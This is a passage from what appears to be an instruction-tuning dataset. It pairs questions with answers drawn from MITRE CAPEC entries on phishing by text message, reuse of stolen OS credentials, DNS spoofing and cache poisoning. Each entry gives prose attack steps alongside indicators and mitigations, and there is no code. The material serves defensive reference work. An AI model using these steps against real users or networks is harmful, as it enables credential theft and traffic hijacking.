              "Modification_Comment": "Updated Attacker_Skills_or_Knowledge_Required, Examples-Instances, References, Solutions_and_Mitigations"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2020-07-30",
              "Modification_Comment": "Updated Description, Example_Instances, Execution_Flow, Related_Weaknesses"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2021-06-24",
              "Modification_Comment": "Updated Related_Weaknesses"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2022-09-29",
              "Modification_Comment": "Updated Example_Instances"
            }
          ]
        }
      }
    }
  },
  {
    "instruction": "What are possible examples for implementing the attack pattern: Collect Data from Common Resource Locations (CAPEC ID: 150)",
    "context": "",
    "output": "Possible examples: An adversary can use a technique called Bluesnarfing to retrieve data from Bluetooth enabled devices in which they know where the data is located. This is done by connecting to the device\u2019s Object Exchange (OBEX) Push Profile and making OBEX GET requests for known filenames (contact lists, photos, recent calls). Bluesnarfing was patched shortly after its discovery in 2003 and will only work on devices created before or during this time.",
    "category": "CAPECFlan",
    "instruction_type": "capec_example_instances",
    "parsed_raw_data": {
      "Example_Instances": "An adversary can use a technique called Bluesnarfing to retrieve data from Bluetooth enabled devices in which they know where the data is located. This is done by connecting to the device\u2019s Object Exchange (OBEX) Push Profile and making OBEX GET requests for known filenames (contact lists, photos, recent calls). Bluesnarfing was patched shortly after its discovery in 2003 and will only work on devices created before or during this time.",
      "@Name": "Collect Data from Common Resource Locations (CAPEC ID: 150)",
      "attack_ptrn": {
        "@ID": "150",
        "@Name": "Collect Data from Common Resource Locations",
        "@Abstraction": "Standard",
        "@Status": "Draft",
        "Description": "An adversary exploits well-known locations for resources for the purposes of undermining the security of the target. In many, if not most systems, files and resources are organized in a default tree structure. This can be useful for adversaries because they often know where to look for resources or files that are necessary for attacks. Even when the precise location of a targeted resource may not be known, naming conventions may indicate a small area of the target machine's file tree where the resources are typically located. For example, configuration files are normally stored in the /etc director on Unix systems. Adversaries can take advantage of this to commit other types of attacks.",
        "Typical_Severity": "Medium",
        "Related_Attack_Patterns": {
          "Related_Attack_Pattern": {
            "@Nature": "ChildOf",
            "@CAPEC_ID": "116",
            "Exclude_Related": {
              "@Exclude_ID": "437"
            }
          }
        },
        "Prerequisites": {
          "Prerequisite": "The targeted applications must either expect files to be located at a specific location or, if the location of the files can be configured by the user, the user either failed to move the files from the default location or placed them in a conventional location for files of the given type."
        },
        "Resources_Required": {
          "Resource": "None: No specialized resources are required to execute this type of attack. In some cases, the attacker need not even have direct access to the locations on the target computer where the targeted resources reside."
        },
        "Example_Instances": {
          "Example": "An adversary can use a technique called Bluesnarfing to retrieve data from Bluetooth enabled devices in which they know where the data is located. This is done by connecting to the device\u2019s Object Exchange (OBEX) Push Profile and making OBEX GET requests for known filenames (contact lists, photos, recent calls). Bluesnarfing was patched shortly after its discovery in 2003 and will only work on devices created before or during this time."
        },
        "Related_Weaknesses": {
          "Related_Weakness": [
            {
              "@CWE_ID": "552"
            },
            {
              "@CWE_ID": "1239"
            },
            {
              "@CWE_ID": "1258"
            },
            {
              "@CWE_ID": "1266"
            },
            {
              "@CWE_ID": "1272"
            },
            {
              "@CWE_ID": "1323"
            },
            {
              "@CWE_ID": "1330"
            }
          ]
        },
        "Taxonomy_Mappings": {
          "Taxonomy_Mapping": [
            {
              "@Taxonomy_Name": "ATTACK",
              "Entry_ID": "1003",
              "Entry_Name": "OS Credential Dumping"
            },
            {
              "@Taxonomy_Name": "ATTACK",
              "Entry_ID": "1119",
              "Entry_Name": "Automated Collection"
            },
            {
              "@Taxonomy_Name": "ATTACK",
              "Entry_ID": "1213",
              "Entry_Name": "Data from Information Repositories"
            },
            {
              "@Taxonomy_Name": "ATTACK",
              "Entry_ID": "1530",
              "Entry_Name": "Data from Cloud Storage Object"
            },
            {
              "@Taxonomy_Name": "ATTACK",
              "Entry_ID": "1555",
              "Entry_Name": "Credentials from Password Stores"
            },
            {
              "@Taxonomy_Name": "ATTACK",
              "Entry_ID": "1602",
              "Entry_Name": "Data from Configuration Repository"
            }
          ]
        },
        "Content_History": {
          "Submission": {
            "Submission_Name": "CAPEC Content Team",
            "Submission_Organization": "The MITRE Corporation",
            "Submission_Date": "2014-06-23"
          },
          "Modification": [
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2015-11-09",
              "Modification_Comment": "Updated Description Summary"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2015-12-07",
              "Modification_Comment": "Updated Description Summary"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2017-08-04",
              "Modification_Comment": "Updated Resources_Required"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2019-04-04",
              "Modification_Comment": "Updated Related_Weaknesses"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2020-07-30",
              "Modification_Comment": "Updated Related_Weaknesses, Taxonomy_Mappings"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2020-12-17",
              "Modification_Comment": "Updated Related_Weaknesses"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2021-06-24",
              "Modification_Comment": "Updated Example_Instances, Related_Attack_Patterns, Taxonomy_Mappings"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2022-09-29",
              "Modification_Comment": "Updated Taxonomy_Mappings"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2023-01-24",
              "Modification_Comment": "Updated Related_Weaknesses"
            }
          ],
          "Previous_Entry_Name": {
            "@Date": "2015-12-07",
            "#text": "Common Resource Location Exploration"
          }
        }
      }
    }
  },
  {
    "instruction": "List examples for 'Mobile Phishing (CAPEC ID: 164)' attack pattern",
    "context": "",
    "output": "Example instances for attack pattern - Mobile Phishing (CAPEC ID: 164) are: The target receives a text message stating that their Apple ID has been disabled due to suspicious activity and that they need to click on the link included in the message to log into their Apple account in order to enable it. The link in the text message looks legitimate and once the link is clicked, the login page is an exact replica of Apple's standard login page. The target supplies their login credentials and are then notified that their account has now been unlocked. However, the adversary has just collected the target's Apple account information, which can now be used by the adversary for a variety of purposes.",
    "category": "CAPECFlan",
    "instruction_type": "capec_example_instances",
    "parsed_raw_data": {
      "Example_Instances": "The target receives a text message stating that their Apple ID has been disabled due to suspicious activity and that they need to click on the link included in the message to log into their Apple account in order to enable it. The link in the text message looks legitimate and once the link is clicked, the login page is an exact replica of Apple's standard login page. The target supplies their login credentials and are then notified that their account has now been unlocked. However, the adversary has just collected the target's Apple account information, which can now be used by the adversary for a variety of purposes.",
      "@Name": "Mobile Phishing (CAPEC ID: 164)",
      "attack_ptrn": {
        "@ID": "164",
        "@Name": "Mobile Phishing",
        "@Abstraction": "Detailed",
        "@Status": "Stable",
        "Description": "An adversary targets mobile phone users with a phishing attack for the purpose of soliciting account passwords or sensitive information from the user. Mobile Phishing is a variation of the Phishing social engineering technique where the attack is initiated via a text or SMS message, rather than email. The user is enticed to provide information or visit a compromised web site via this message. Apart from the manner in which the attack is initiated, the attack proceeds as a standard Phishing attack.",
        "Alternate_Terms": {
          "Alternate_Term": [
            {
              "Term": "Smishing"
            },
            {
              "Term": "MobPhishing"
            }
          ]
        },
        "Likelihood_Of_Attack": "High",
        "Typical_Severity": "High",
        "Related_Attack_Patterns": {
          "Related_Attack_Pattern": {
            "@Nature": "ChildOf",
            "@CAPEC_ID": "98"
          }
        },
        "Execution_Flow": {
          "Attack_Step": [
            {
              "Step": "1",
              "Phase": "Explore",
              "Description": "[Obtain domain name and certificate to spoof legitimate site] This optional step can be used to help the adversary impersonate the legitimate site more convincingly. The adversary can use homograph or similar attacks to convince users that they are using the legitimate website. Note that this step is not required for phishing attacks, and many phishing attacks simply supply URLs containing an IP address and no SSL certificate.",
              "Technique": [
                "Optionally obtain a domain name that visually looks similar to the legitimate site's domain name. An example is www.paypaI.com vs. www.paypal.com (the first one contains a capital i, instead of a lower case L)",
                "Optionally obtain a legitimate SSL certificate for the new domain name."
              ]
            },
            {
              "Step": "2",
              "Phase": "Explore",
              "Description": "[Explore legitimate website and create duplicate] An adversary creates a website (optionally at a URL that looks similar to the original URL) that closely resembles the website that they are trying to impersonate. That website will typically have a login form for the victim to put in their authentication credentials. There can be different variations on a theme here.",
              "Technique": [
                "Use spidering software to get copy of web pages on legitimate site.",
                "Manually save copies of required web pages from legitimate site.",
                "Create new web pages that have the legitimate site's look and feel, but contain completely new content."
              ]
            },
            {
              "Step": "3",
              "Phase": "Exploit",
              "Description": "[Convince user to enter sensitive information on adversary's site.] An adversary sends a text message to the victim that has a call-to-action, in order to persuade the user into clicking the included link (which then takes the victim to the adversary's website) and logging in. The key is to get the victim to believe that the text message originates from a legitimate entity with which the victim does business and that the website pointed to by the URL in the text message is the legitimate website. A call-to-action will usually need to sound legitimate and urgent enough to prompt action from the user.",
              "Technique": "Send the user a message from a spoofed legitimate-looking mobile number that asks the user to click on the included link."
            },
            {
              "Step": "4",
              "Phase": "Exploit",
              "Description": "[Use stolen credentials to log into legitimate site] Once the adversary captures some sensitive information through phishing (login credentials, credit card information, etc.) the adversary can leverage this information. For instance, the adversary can use the victim's login credentials to log into their bank account and transfer money to an account of their choice.",
              "Technique": "Log in to the legitimate site using another user's supplied credentials"
            }
          ]
        },
        "Prerequisites": {
          "Prerequisite": [
            "An adversary needs mobile phone numbers to initiate contact with the victim.",
            "An adversary needs to correctly guess the entity with which the victim does business and impersonate it. Most of the time phishers just use the most popular banks/services and send out their \"hooks\" to many potential victims.",
            "An adversary needs to have a sufficiently compelling call to action to prompt the user to take action.",
            "The replicated website needs to look extremely similar to the original website and the URL used to get to that website needs to look like the real URL of the said business entity."
          ]
        },
        "Skills_Required": {
          "Skill": {
            "@Level": "Medium",
            "#text": "Basic knowledge about websites: obtaining them, designing and implementing them, etc."
          }
        },
        "Resources_Required": {
          "Resource": "Either mobile phone or access to a web resource that allows text messages to be sent to mobile phones. Resources needed for regular Phishing attack."
        },
        "Indicators": {
          "Indicator": [
            "You receive a text message from an entity that you are not even a customer of prompting you to log into your account.",
            "You receive any text message that provides you with a link that takes you to a website which requires you to enter your credentials."
          ]
        },
        "Consequences": {
          "Consequence": [
            {
              "Scope": [
                "Confidentiality",
                "Access Control",
                "Authorization"
              ],
              "Impact": "Gain Privileges"
            },
            {
              "Scope": "Confidentiality",
              "Impact": "Read Data"
            },
            {
              "Scope": "Integrity",
              "Impact": "Modify Data"
            }
          ]
        },
        "Mitigations": {
          "Mitigation": "Do not follow any links that you receive within text messages and do not input any login credentials on the page that they take you too. Instead, call your Bank, PayPal, eBay, etc., and inquire about the problem. Safe practices also include leveraging the entity's mobile application or directly typing the entity's URL in the browser and only then logging in. Never reply to any text messages that ask you to provide sensitive information of any kind."
        },
        "Example_Instances": {
          "Example": "The target receives a text message stating that their Apple ID has been disabled due to suspicious activity and that they need to click on the link included in the message to log into their Apple account in order to enable it. The link in the text message looks legitimate and once the link is clicked, the login page is an exact replica of Apple's standard login page. The target supplies their login credentials and are then notified that their account has now been unlocked. However, the adversary has just collected the target's Apple account information, which can now be used by the adversary for a variety of purposes."
        },
        "Related_Weaknesses": {
          "Related_Weakness": {
            "@CWE_ID": "451"
          }
        },
        "References": {
          "Reference": [
            {
              "@External_Reference_ID": "REF-590"
            },
            {
              "@External_Reference_ID": "REF-591"
            },
            {
              "@External_Reference_ID": "REF-592"
            },
            {
              "@External_Reference_ID": "REF-593"
            },
            {
              "@External_Reference_ID": "REF-696"
            }
          ]
        },
        "Content_History": {
          "Submission": {
            "Submission_Name": "CAPEC Content Team",
            "Submission_Organization": "The MITRE Corporation",
            "Submission_Date": "2014-06-23"
          },
          "Modification": [
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2017-01-09",
              "Modification_Comment": "Updated Alternate_Terms"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2020-12-17",
              "Modification_Comment": "Updated @Status, Alternate_Terms, Consequences, Description, Example_Instances, Execution_Flow, Indicators, Likelihood_Of_Attack, Mitigations, Prerequisites, References, Skills_Required"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2022-02-22",
              "Modification_Comment": "Updated References"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2023-01-24",
              "Modification_Comment": "Updated Related_Weaknesses"
            }
          ],
          "Previous_Entry_Name": {
            "@Date": "2017-01-09",
            "#text": "Mobile Phishing (aka MobPhishing)"
          }
        }
      }
    }
  },
  {
    "instruction": "Given the attack pattern: Use of Known Operating System Credentials (CAPEC ID: 653), give me an example instances for this pattern",
    "context": "",
    "output": "Sure. Examples can be: Adversaries exploited the Zoom video conferencing application during the 2020 COVID-19 pandemic to exfiltrate Windows domain credentials from a target system. The attack entailed sending Universal Naming Convention (UNC) paths within the Zoom chat window of an unprotected Zoom call. If the victim clicked on the link, their Windows usernames and the corresponding Net-NTLM-v2 hashes were sent to the address contained in the link. The adversary was then able to infiltrate and laterally move within the Windows domain by passing the acquired credentials to shared network resources. This further provided adversaries with access to Outlook servers and network storage devices. [REF-575]\n* Mimikatz, a post-exploitation Windows credential harvester, can be used to gather and exploit Windows credentials. This malware has been used in several known cyberattacks, such as the Petya Ransomeware attacks. [REF-576]",
    "category": "CAPECFlan",
    "instruction_type": "capec_example_instances",
    "parsed_raw_data": {
      "Example_Instances": [
        "Adversaries exploited the Zoom video conferencing application during the 2020 COVID-19 pandemic to exfiltrate Windows domain credentials from a target system. The attack entailed sending Universal Naming Convention (UNC) paths within the Zoom chat window of an unprotected Zoom call. If the victim clicked on the link, their Windows usernames and the corresponding Net-NTLM-v2 hashes were sent to the address contained in the link. The adversary was then able to infiltrate and laterally move within the Windows domain by passing the acquired credentials to shared network resources. This further provided adversaries with access to Outlook servers and network storage devices. [REF-575]",
        "Mimikatz, a post-exploitation Windows credential harvester, can be used to gather and exploit Windows credentials. This malware has been used in several known cyberattacks, such as the Petya Ransomeware attacks. [REF-576]"
      ],
      "@Name": "Use of Known Operating System Credentials (CAPEC ID: 653)",
      "attack_ptrn": {
        "@ID": "653",
        "@Name": "Use of Known Operating System Credentials",
        "@Abstraction": "Standard",
        "@Status": "Draft",
        "Description": "An adversary guesses or obtains (i.e. steals or purchases) legitimate operating system credentials (e.g. userID/password) to achieve authentication and to perform authorized actions on the system, under the guise of an authenticated user or service. This applies to any Operating System.",
        "Extended_Description": {
          "xhtml:p": "This attack can be extremely harmful when the operating system credentials used are for a root or admin user. Once an adversary gains access using credentials with elevated privileges, they are free to alter important system files which can effect other users who may use the system or other users on the system's network."
        },
        "Likelihood_Of_Attack": "High",
        "Typical_Severity": "High",
        "Related_Attack_Patterns": {
          "Related_Attack_Pattern": [
            {
              "@Nature": "ChildOf",
              "@CAPEC_ID": "560",
              "Exclude_Related": {
                "@Exclude_ID": "515"
              }
            },
            {
              "@Nature": "CanPrecede",
              "@CAPEC_ID": "151"
            }
          ]
        },
        "Execution_Flow": {
          "Attack_Step": [
            {
              "Step": "1",
              "Phase": "Explore",
              "Description": "[Acquire known operating system credentials] The adversary must obtain known operating system credentials in order to access the target system, application, or service within the domain.",
              "Technique": [
                "An adversary purchases breached operating system username/password combinations or leaked hashed passwords from the dark web.",
                "An adversary leverages a key logger or phishing attack to steal user credentials as they are provided.",
                "An adversary conducts a sniffing attack to steal operating system credentials as they are transmitted.",
                "An adversary gains access to a system/files and exfiltrates password hashes.",
                "An adversary examines outward-facing configuration and properties files to discover hardcoded credentials."
              ]
            },
            {
              "Step": "2",
              "Phase": "Experiment",
              "Description": "[Attempt authentication] Try each operating system credential against various systems, applications, and services within the domain until the target grants access.",
              "Technique": "Manually or automatically enter each credential through the target's interface."
            },
            {
              "Step": "3",
              "Phase": "Exploit",
              "Description": "[Impersonate] An adversary can use successful experiments or authentications to impersonate an authorized user or system, or to laterally move within the network"
            },
            {
              "Step": "4",
              "Phase": "Exploit",
              "Description": "[Spoofing] Malicious data can be injected into the target system or into other systems on the network. The adversary can also pose as a legitimate user to perform social engineering attacks."
            },
            {
              "Step": "5",
              "Phase": "Exploit",
              "Description": "[Data Exfiltration] The adversary can obtain sensitive data contained within system files or application configuration."
            }
          ]
        },
        "Prerequisites": {
          "Prerequisite": [
            "The system/application uses one factor password-based authentication, SSO, and/or cloud-based authentication.",
            "The system/application does not have a sound password policy that is being enforced.",
            "The system/application does not implement an effective password throttling mechanism.",
            "The adversary possesses a list of known user accounts and corresponding passwords that may exist on the target."
          ]
        },
        "Skills_Required": {
          "Skill": {
            "@Level": "Low",
            "#text": "Once an adversary obtains a known credential, leveraging it is trivial."
          }
        },
        "Resources_Required": {
          "Resource": [
            "A list of known credentials for the targeted domain.",
            "A custom script that leverages a credential list to launch an attack."
          ]
        },
        "Indicators": {
          "Indicator": [
            "Authentication attempts use credentials that have been used previously by the account in question.",
            "Authentication attempts are originating from IP addresses or locations that are inconsistent with a user's normal IP addresses or locations.",
            "Data is being transferred and/or removed from systems/applications within the network.",
            "Suspicious or Malicious software is downloaded/installed on systems within the domain.",
            "Messages from a legitimate user appear to contain suspicious links or communications not consistent with the user's normal behavior."
          ]
        },
        "Consequences": {
          "Consequence": [
            {
              "Scope": [
                "Confidentiality",
                "Access Control",
                "Authentication"
              ],
              "Impact": "Gain Privileges"
            },
            {
              "Scope": [
                "Confidentiality",
                "Authorization"
              ],
              "Impact": "Read Data"
            },
            {
              "Scope": "Integrity",
              "Impact": "Modify Data"
            }
          ]
        },
        "Mitigations": {
          "Mitigation": [
            "Leverage multi-factor authentication for all authentication services and prior to granting an entity access to the network.",
            "Create a strong password policy and ensure that your system enforces this policy.",
            "Ensure users are not reusing username/password combinations for multiple systems, applications, or services.",
            "Do not reuse local administrator account credentials across systems.",
            "Deny remote use of local admin credentials to log into domain systems.",
            "Do not allow accounts to be a local administrator on more than one system.",
            "Implement an intelligent password throttling mechanism. Care must be taken to assure that these mechanisms do not excessively enable account lockout attacks such as CAPEC-2.",
            "Monitor system and domain logs for abnormal credential access."
          ]
        },
        "Example_Instances": {
          "Example": [
            "Adversaries exploited the Zoom video conferencing application during the 2020 COVID-19 pandemic to exfiltrate Windows domain credentials from a target system. The attack entailed sending Universal Naming Convention (UNC) paths within the Zoom chat window of an unprotected Zoom call. If the victim clicked on the link, their Windows usernames and the corresponding Net-NTLM-v2 hashes were sent to the address contained in the link. The adversary was then able to infiltrate and laterally move within the Windows domain by passing the acquired credentials to shared network resources. This further provided adversaries with access to Outlook servers and network storage devices. [REF-575]",
            "Mimikatz, a post-exploitation Windows credential harvester, can be used to gather and exploit Windows credentials. This malware has been used in several known cyberattacks, such as the Petya Ransomeware attacks. [REF-576]"
          ]
        },
        "Related_Weaknesses": {
          "Related_Weakness": [
            {
              "@CWE_ID": "522"
            },
            {
              "@CWE_ID": "307"
            },
            {
              "@CWE_ID": "308"
            },
            {
              "@CWE_ID": "309"
            },
            {
              "@CWE_ID": "262"
            },
            {
              "@CWE_ID": "263"
            },
            {
              "@CWE_ID": "654"
            }
          ]
        },
        "References": {
          "Reference": [
            {
              "@External_Reference_ID": "REF-575"
            },
            {
              "@External_Reference_ID": "REF-576"
            }
          ]
        },
        "Content_History": {
          "Submission": {
            "Submission_Name": "CAPEC Content Team",
            "Submission_Organization": "The MITRE Corporation",
            "Submission_Date": "2020-07-30"
          },
          "Modification": [
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2022-02-22",
              "Modification_Comment": "Updated Description, Extended_Description"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2022-09-29",
              "Modification_Comment": "Updated @Name, Description, Execution_Flow, Extended_Description, Mitigations, Prerequisites, Resources_Required, Skills_Required"
            }
          ],
          "Previous_Entry_Name": {
            "@Date": "2022-09-29",
            "#text": "Use of Known Windows Credentials"
          }
        }
      }
    }
  },
  {
    "instruction": "Give me an usage example for attack pattern - DNS Spoofing (CAPEC ID: 598)",
    "context": "",
    "output": "Below-Recursive DNS Poisoning: When an On/In-path device between a recursive DNS server and a user sends a malicious (\"NXDOMAIN\" (\"No such domain\") code, or DNS A record ) response before a legitimate resolver can.\n* Above-Recursive DNS Poisoning: When an On/In-path device between an authority server (e.g., government-managed) and a recursive DNS server sends a malicious (\"NXDOMAIN\" (\"No such domain\")code, or a DNS record) response before a legitimate resolver can.",
    "category": "CAPECFlan",
    "instruction_type": "capec_example_instances",
    "parsed_raw_data": {
      "Example_Instances": [
        "Below-Recursive DNS Poisoning: When an On/In-path device between a recursive DNS server and a user sends a malicious (\"NXDOMAIN\" (\"No such domain\") code, or DNS A record ) response before a legitimate resolver can.",
        "Above-Recursive DNS Poisoning: When an On/In-path device between an authority server (e.g., government-managed) and a recursive DNS server sends a malicious (\"NXDOMAIN\" (\"No such domain\")code, or a DNS record) response before a legitimate resolver can."
      ],
      "@Name": "DNS Spoofing (CAPEC ID: 598)",
      "attack_ptrn": {
        "@ID": "598",
        "@Name": "DNS Spoofing",
        "@Abstraction": "Detailed",
        "@Status": "Draft",
        "Description": "An adversary sends a malicious (\"NXDOMAIN\" (\"No such domain\") code, or DNS A record) response to a target's route request before a legitimate resolver can. This technique requires an On-path or In-path device that can monitor and respond to the target's DNS requests. This attack differs from BGP Tampering in that it directly responds to requests made by the target instead of polluting the routing the target's infrastructure uses.",
        "Related_Attack_Patterns": {
          "Related_Attack_Pattern": {
            "@Nature": "ChildOf",
            "@CAPEC_ID": "194",
            "Exclude_Related": [
              {
                "@Exclude_ID": "403"
              },
              {
                "@Exclude_ID": "515"
              }
            ]
          }
        },
        "Prerequisites": {
          "Prerequisite": "On/In Path Device"
        },
        "Skills_Required": {
          "Skill": {
            "@Level": "Low",
            "#text": "To distribute email"
          }
        },
        "Mitigations": {
          "Mitigation": [
            "Design: Avoid dependence on DNS",
            "Design: Include \"hosts file\"/IP address in the application",
            "Implementation: Utilize a .onion domain with Tor support",
            "Implementation: DNSSEC",
            "Implementation: DNS-hold-open"
          ]
        },
        "Example_Instances": {
          "Example": [
            "Below-Recursive DNS Poisoning: When an On/In-path device between a recursive DNS server and a user sends a malicious (\"NXDOMAIN\" (\"No such domain\") code, or DNS A record ) response before a legitimate resolver can.",
            "Above-Recursive DNS Poisoning: When an On/In-path device between an authority server (e.g., government-managed) and a recursive DNS server sends a malicious (\"NXDOMAIN\" (\"No such domain\")code, or a DNS record) response before a legitimate resolver can."
          ]
        },
        "References": {
          "Reference": [
            {
              "@External_Reference_ID": "REF-477"
            },
            {
              "@External_Reference_ID": "REF-479"
            }
          ]
        },
        "Content_History": {
          "Submission": {
            "Submission_Name": "Seamus Tuohy",
            "Submission_Date": "2017-01-04"
          },
          "Modification": [
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2019-04-04",
              "Modification_Comment": "Updated Related_Attack_Patterns"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2022-09-29",
              "Modification_Comment": "Updated Related_Attack_Patterns"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2023-01-24",
              "Modification_Comment": "Updated Description"
            }
          ]
        }
      }
    }
  },
  {
    "instruction": "Given the attack pattern: DNS Cache Poisoning (CAPEC ID: 142), give me an example instances for this pattern",
    "context": "",
    "output": "Sure. Examples can be: In this example, an adversary sends request to a local DNS server to look up www.example .com. The associated IP address of www.example.com is 1.3.5.7.\n- Local DNS usually caches IP addresses and do not go to remote DNS every time. Since the local record is not found, DNS server tries to connect to remote DNS for queries. However, before the remote DNS returns the right IP address 1.3.5.7, the adversary floods local DNS with crafted responses with IP address 2.4.6.8. The result is that 2.4.6.8 is stored in DNS cache. Meanwhile, 2.4.6.8 is associated with a malicious website www.maliciousexampsle.com\n- When users connect to www.example.com, the local DNS will direct it to www.maliciousexample.com, this works as part of a Pharming attack.",
    "category": "CAPECFlan",
    "instruction_type": "capec_example_instances",
    "parsed_raw_data": {
      "Example_Instances": [
        "In this example, an adversary sends request to a local DNS server to look up www.example .com. The associated IP address of www.example.com is 1.3.5.7.",
        "Local DNS usually caches IP addresses and do not go to remote DNS every time. Since the local record is not found, DNS server tries to connect to remote DNS for queries. However, before the remote DNS returns the right IP address 1.3.5.7, the adversary floods local DNS with crafted responses with IP address 2.4.6.8. The result is that 2.4.6.8 is stored in DNS cache. Meanwhile, 2.4.6.8 is associated with a malicious website www.maliciousexampsle.com",
        "When users connect to www.example.com, the local DNS will direct it to www.maliciousexample.com, this works as part of a Pharming attack."
      ],
      "@Name": "DNS Cache Poisoning (CAPEC ID: 142)",
      "attack_ptrn": {
        "@ID": "142",
        "@Name": "DNS Cache Poisoning",
        "@Abstraction": "Detailed",
        "@Status": "Draft",
        "Description": "A domain name server translates a domain name (such as www.example.com) into an IP address that Internet hosts use to contact Internet resources. An adversary modifies a public DNS cache to cause certain names to resolve to incorrect addresses that the adversary specifies. The result is that client applications that rely upon the targeted cache for domain name resolution will be directed not to the actual address of the specified domain name but to some other address. Adversaries can use this to herd clients to sites that install malware on the victim's computer or to masquerade as part of a Pharming attack.",
        "Likelihood_Of_Attack": "High",
        "Typical_Severity": "High",
        "Related_Attack_Patterns": {
          "Related_Attack_Pattern": [
            {
              "@Nature": "ChildOf",
              "@CAPEC_ID": "141"
            },
            {
              "@Nature": "CanPrecede",
              "@CAPEC_ID": "89"
            }
          ]
        },
        "Execution_Flow": {
          "Attack_Step": [
            {
              "Step": "1",
              "Phase": "Explore",
              "Description": "[Explore resolver caches] Check DNS caches on local DNS server and client's browser with DNS cache enabled.",
              "Technique": [
                "Run tools that check the resolver cache in the memory to see if it contains a target DNS entry.",
                "Figure out if the client's browser has DNS cache enabled."
              ]
            },
            {
              "Step": "2",
              "Phase": "Experiment",
              "Description": "[Attempt sending crafted records to DNS cache] A request is sent to the authoritative server for target website and wait for the iterative name resolver. An adversary sends bogus request to the DNS local server, and then floods responses that trick a DNS cache to remember malicious responses, which are wrong answers of DNS query.",
              "Technique": [
                "Adversary must know the transaction ID by intercepting a DNS query, or sending a bogus query with known transaction ID.",
                "If the transaction ID used to identify each query instance is randomized in some new DNS software, the attack must guess the transaction ID. Slow the response of the real DNS server by causing Denial-of-service. This gives adversaries enough time to guess transaction",
                "Adversary crafts DNS response with the same transaction ID as in the request. The adversary sends out DNS responses before the authorized DNS server. This forces DNS local cache stores fake DNS response (wrong answer). The fake DNS responses usually include a malicious website's IP address."
              ]
            },
            {
              "Step": "3",
              "Phase": "Exploit",
              "Description": "[Redirect users to malicious website] As the adversary succeeds in exploiting the vulnerability, the victim connects to a malicious site using a good web site's domain name.",
              "Technique": [
                "Redirecting Web traffic to a site that looks enough like the original so as to not raise any suspicion.",
                "Adversary-in-the-Middle (CAPEC-94) intercepts secure communication between two parties."
              ]
            }
          ]
        },
        "Prerequisites": {
          "Prerequisite": "A DNS cache must be vulnerable to some attack that allows the adversary to replace addresses in its lookup table.Client applications must trust the corrupted cashed values and utilize them for their domain name resolutions."
        },
        "Skills_Required": {
          "Skill": {
            "@Level": "Medium",
            "#text": "To overwrite/modify targeted DNS cache"
          }
        },
        "Resources_Required": {
          "Resource": "The adversary must have the resources to modify the targeted cache. In addition, in most cases the adversary will wish to host the sites to which users will be redirected, although in some cases redirecting to a third party site will accomplish the adversary's goals."
        },
        "Mitigations": {
          "Mitigation": [
            "Configuration: Make sure your DNS servers have been updated to the latest versions",
            "Configuration: UNIX services like rlogin, rsh/rcp, xhost, and nfs are all susceptible to wrong information being held in a cache. Care should be taken with these services so they do not rely upon DNS caches that have been exposed to the Internet.",
            "Configuration: Disable client side DNS caching."
          ]
        },
        "Example_Instances": {
          "Example": {
            "xhtml:p": [
              "In this example, an adversary sends request to a local DNS server to look up www.example .com. The associated IP address of www.example.com is 1.3.5.7.",
              "Local DNS usually caches IP addresses and do not go to remote DNS every time. Since the local record is not found, DNS server tries to connect to remote DNS for queries. However, before the remote DNS returns the right IP address 1.3.5.7, the adversary floods local DNS with crafted responses with IP address 2.4.6.8. The result is that 2.4.6.8 is stored in DNS cache. Meanwhile, 2.4.6.8 is associated with a malicious website www.maliciousexampsle.com",
              "When users connect to www.example.com, the local DNS will direct it to www.maliciousexample.com, this works as part of a Pharming attack."
            ]
          }
        },
        "Related_Weaknesses": {
          "Related_Weakness": [
            {
              "@CWE_ID": "348"
            },
            {
              "@CWE_ID": "345"
            },
            {
              "@CWE_ID": "349"
            },
            {
              "@CWE_ID": "346"
            },
            {
              "@CWE_ID": "350"
            }
          ]
        },
        "Taxonomy_Mappings": {
          "Taxonomy_Mapping": {
            "@Taxonomy_Name": "ATTACK",
            "Entry_ID": "1584.002",
            "Entry_Name": "Compromise Infrastructure: DNS Server"
          }
        },
        "References": {
          "Reference": [
            {
              "@External_Reference_ID": "REF-22",
              "@Section": "DNS Cache Poisoning"
            },
            {
